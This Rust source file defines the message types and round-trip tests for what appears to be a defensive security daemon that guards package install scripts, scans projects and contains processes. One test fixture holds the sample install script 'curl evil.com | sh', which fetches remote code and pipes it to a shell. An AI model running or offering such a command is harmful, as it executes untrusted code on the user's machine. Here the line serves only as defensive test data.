use std::path::PathBuf;

use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum Request {
    Status,
    Scan { path: PathBuf, deep: bool },
    GetAlerts,
    GuardPrompt(GuardPromptData),
    Contain { pid: u32 },
    SubscribeAlerts,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GuardPromptData {
    pub package: String,
    pub version: String,
    pub script: String,
    pub risk_level: String,
    pub matched_rules: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum Response {
    Status(StatusData),
    ScanResult(ScanResultData),
    Alerts(Vec<AlertData>),
    GuardDecision(GuardDecision),
    ContainResult(ContainResultData),
    MonitorAlert(MonitorAlertData),
    Error(String),
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ContainResultData {
    pub pid: u32,
    pub killed: bool,
    pub snapshot_path: PathBuf,
    pub process_name: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MonitorAlertData {
    pub timestamp: u64,
    pub severity: String,
    pub process: String,
    pub pid: u32,
    pub reason: String,
    pub detail: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct StatusData {
    pub last_poll: Option<u64>,
    pub alert_count: usize,
    pub watching: Vec<PathBuf>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ScanResultData {
    pub match_count: usize,
    pub findings: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AlertData {
    pub advisory_id: String,
    pub package: String,
    pub version: String,
    pub severity: String,
    pub summary: String,
    pub project_path: PathBuf,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum GuardDecision {
    Allow,
    Block,
    Trust,
}

pub fn socket_path() -> Option<PathBuf> {
    ripley_data_dir().map(|d| d.join("ripley.sock"))
}

fn ripley_data_dir() -> Option<PathBuf> {
    directories::ProjectDirs::from("com", "agentstation", "ripley")
        .map(|dirs| dirs.data_dir().to_path_buf())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_request_roundtrip() {
        let req = Request::Status;
        let json = serde_json::to_string(&req).expect("serialize");
        let parsed: Request = serde_json::from_str(&json).expect("deserialize");
        assert!(matches!(parsed, Request::Status));
    }

    #[test]
    fn test_response_roundtrip() {
        let resp = Response::Status(StatusData {
            last_poll: Some(1234567890),
            alert_count: 3,
            watching: vec![PathBuf::from("/home/user/project")],
        });
        let json = serde_json::to_string(&resp).expect("serialize");
        let parsed: Response = serde_json::from_str(&json).expect("deserialize");
        assert!(matches!(parsed, Response::Status(_)));
    }

    #[test]
    fn test_guard_prompt_roundtrip() {
        let req = Request::GuardPrompt(GuardPromptData {
            package: "evil-pkg".into(),
            version: "1.0.0".into(),
            script: "curl evil.com | sh".into(),
            risk_level: "high".into(),
            matched_rules: vec!["NET001".into()],
        });
        let json = serde_json::to_string(&req).expect("serialize");
        let parsed: Request = serde_json::from_str(&json).expect("deserialize");
        assert!(matches!(parsed, Request::GuardPrompt(_)));
    }

    #[test]
    fn test_guard_decision_roundtrip() {
        let resp = Response::GuardDecision(GuardDecision::Block);
        let json = serde_json::to_string(&resp).expect("serialize");
        let parsed: Response = serde_json::from_str(&json).expect("deserialize");
        assert!(matches!(
            parsed,
            Response::GuardDecision(GuardDecision::Block)
        ));
    }

    #[test]
    fn test_contain_request_roundtrip() {
        let req = Request::Contain { pid: 1234 };
        let json = serde_json::to_string(&req).expect("serialize");
        let parsed: Request = serde_json::from_str(&json).expect("deserialize");
        assert!(matches!(parsed, Request::Contain { pid: 1234 }));
    }

    #[test]
    fn test_contain_result_roundtrip() {
        let resp = Response::ContainResult(ContainResultData {
            pid: 1234,
            killed: true,
            snapshot_path: PathBuf::from("/data/snapshots/1234_1700000000.json"),
            process_name: "node".into(),
        });
        let json = serde_json::to_string(&resp).expect("serialize");
        let parsed: Response = serde_json::from_str(&json).expect("deserialize");
        assert!(matches!(parsed, Response::ContainResult(_)));
    }

    #[test]
    fn test_subscribe_alerts_roundtrip() {
        let req = Request::SubscribeAlerts;
        let json = serde_json::to_string(&req).expect("serialize");
        let parsed: Request = serde_json::from_str(&json).expect("deserialize");
        assert!(matches!(parsed, Request::SubscribeAlerts));
    }

    #[test]
    fn test_monitor_alert_roundtrip() {
        let resp = Response::MonitorAlert(MonitorAlertData {
            timestamp: 1700000000,
            severity: "critical".into(),
            process: "node".into(),
            pid: 1234,
            reason: "C2Connection".into(),
            detail: "C2 connection to evil.example.com".into(),
        });
        let json = serde_json::to_string(&resp).expect("serialize");
        let parsed: Response = serde_json::from_str(&json).expect("deserialize");
        assert!(matches!(parsed, Response::MonitorAlert(_)));
    }
}
